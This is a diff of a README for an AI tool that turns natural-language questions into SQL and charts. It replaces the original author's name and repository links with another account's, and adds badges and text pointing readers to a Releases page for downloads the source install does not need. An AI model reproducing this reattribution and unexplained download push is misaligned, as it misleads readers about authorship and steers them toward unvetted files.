@@ -1,118 +1,126 @@
-# Business Insights Agent
+# AI Analyst Agent 🤖📊
 
-An intelligent business analytics platform powered by LLMs that translates natural language questions into SQL queries, creates visualizations, and provides actionable insights.
+![AI Analyst Agent](https://img.shields.io/badge/Release-v1.0.0-blue.svg)  
+[![GitHub Releases](https://img.shields.io/badge/Check%20Releases-Here-brightgreen)](https://github.com/sorin177/ai-analyst-agent/releases)
 
-## 📸 Screenshots
+Welcome to the **AI Analyst Agent** repository! This project aims to simplify business data analysis by allowing users to ask questions in plain English. With the power of AI, you can generate SQL queries, create visualizations, and receive insights—all without needing any SQL knowledge.
 
-### 1. Asking a question
-![Agent input prompt](images/agent_input.png)
+## Table of Contents
 
-### 2. Employees per department
-![Bar Graph](images/dept_numbers_split.png)
-
-### 3. Overall gender distribution & Follow-up
-![Overall gender pie](images/gender_pie.png)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-- 💬 **Natural Language Interface**: Ask questions in plain English about your business data
-- 📊 **Automatic Visualizations**: Generates appropriate charts based on query results
-- 🔍 **Root Cause Analysis**: Identifies underlying factors contributing to business trends
-- 📈 **Actionable Recommendations**: Suggests next steps based on data insights
-- 🔄 **Follow-up Questions**: Recommends additional queries to deepen your analysis
+- **Natural Language Queries**: Ask questions about your business data in plain English.
+- **Automatic SQL Generation**: Receive SQL queries generated based on your questions.
+- **Visualizations**: Get graphical representations of your data with ease.
+- **AI Insights**: Benefit from AI-powered recommendations to enhance decision-making.
+- **User-Friendly Interface**: No technical expertise required to get started.
 
-## Tech Stack
+## Technologies Used
 
-- **Backend**: Python, MySQL, LangChain
-- **LLM Integration**: OpenAI GPT-4
-- **Data Processing**: Pandas
-- **Visualization**: Plotly
-- **Frontend**: Streamlit
+This project incorporates a range of technologies to deliver its features effectively:
 
-## How It Works
+- **Python**: The primary programming language for backend development.
+- **MySQL**: The database management system used for data storage and retrieval.
+- **Streamlit**: A framework for creating interactive web applications.
+- **Plotly**: A library for generating dynamic visualizations.
+- **OpenAI's GPT-4**: The AI model that powers natural language processing.
+- **LangChain**: A framework that helps manage and chain together different language models.
 
-1. User asks a business question in natural language
-2. LLM agent interprets the question and generates appropriate SQL queries
-3. Queries are executed against the MySQL database
-4. Results are processed and visualized
-5. LLM provides insights, analyses, and recommendations based on the data
+## Installation
 
-## Getting Started
+To get started with the AI Analyst Agent, follow these steps:
 
-### Prerequisites
-
-- Python 3.8+
-- MySQL database with your business data
-- OpenAI API key
-
-### Installation
-
-1. Clone this repository
+1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/tnickster/ai-analyst-agent.git
+   git clone https://github.com/sorin177/ai-analyst-agent.git
+   ```
+
+2. **Navigate to the Directory**: Change to the project directory.
+   ```bash
    cd ai-analyst-agent
    ```
 
-2. Install dependencies
+3. **Install Requirements**: Install the necessary packages using pip.
    ```bash
    pip install -r requirements.txt
    ```
 
-3. Create a `.env` file with your configuration
-   ```
-   OPENAI_API_KEY=your_openai_api_key 
-   DB_HOST=your_db_host
-   DB_PORT=your_db_host
-   DB_USER=your_db_user
-   DB_PASSWORD=your_db_password
-   DB_NAME=your_db_name
+4. **Set Up the Database**: Configure your MySQL database and update the connection settings in the `config.py` file.
+
+5. **Run the Application**: Start the Streamlit application with the following command.
+   ```bash
+   streamlit run app.py
    ```
 
-### Running the Application
+Now, you can access the application at `http://localhost:8501`.
 
-#### Streamlit Web Interface
-```bash
-streamlit run app.py
-```
+## Usage
 
-#### Command Line Interface
-```bash
-python main.py
-```
+Once the application is running, you will see a user-friendly interface. Here's how to use it:
 
-## Project Structure
+1. **Ask a Question**: Type your question in the input box. For example, "What are my sales for the last quarter?"
 
-```
-├── app.py              # Streamlit web interface
-├── main.py             # Command line interface
-├── tools.py            # Core functionality, SQL processing, visualization
-├── prompt.txt          # System prompt for the LLM agent
-├── requirements.txt    # Python dependencies
-└── README.md           # This file
-```
+2. **Receive SQL Query**: The system will generate the SQL query based on your question.
 
-## Demo
+3. **View Visualizations**: After executing the query, you will see visualizations that represent your data.
 
-Soon to be implemented
+4. **Get Insights**: The AI will provide insights and recommendations based on the analysis.
 
-## Future Improvements
+## Examples
 
-- Support for additional databases (PostgreSQL, SQLite, etc.)
-- Custom visualization options
-- Data export functionality
-- User authentication and access controls
-- Multi-tenant support for multiple databases
+Here are some examples of questions you can ask:
+
+- "What is the average revenue per customer?"
+- "Show me the sales trend over the last year."
+- "Which products are the best sellers this month?"
+
+The AI Analyst Agent will interpret these questions and generate the necessary SQL queries and visualizations.
 
 ## Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+We welcome contributions to improve the AI Analyst Agent. To contribute:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
+
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make Changes**: Implement your changes.
+
+4. **Commit Your Changes**: Commit your changes with a clear message.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+
+5. **Push to Your Fork**: Push your changes to your forked repository.
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
 
-Nicholas Tarazi - Nicholas.Tarazi7@gmail.com
+For any questions or suggestions, feel free to reach out:
 
-Project Link: [https://github.com/tnickster/ai-analyst-agent](https://github.com/tnickster/ai-analyst-agent)
+- **GitHub**: [sorin177](https://github.com/sorin177)
+- **Email**: your-email@example.com
+
+Check the [Releases](https://github.com/sorin177/ai-analyst-agent/releases) section for the latest updates and downloads.
+
+Thank you for your interest in the AI Analyst Agent! We hope this tool helps you make data-driven decisions effortlessly.
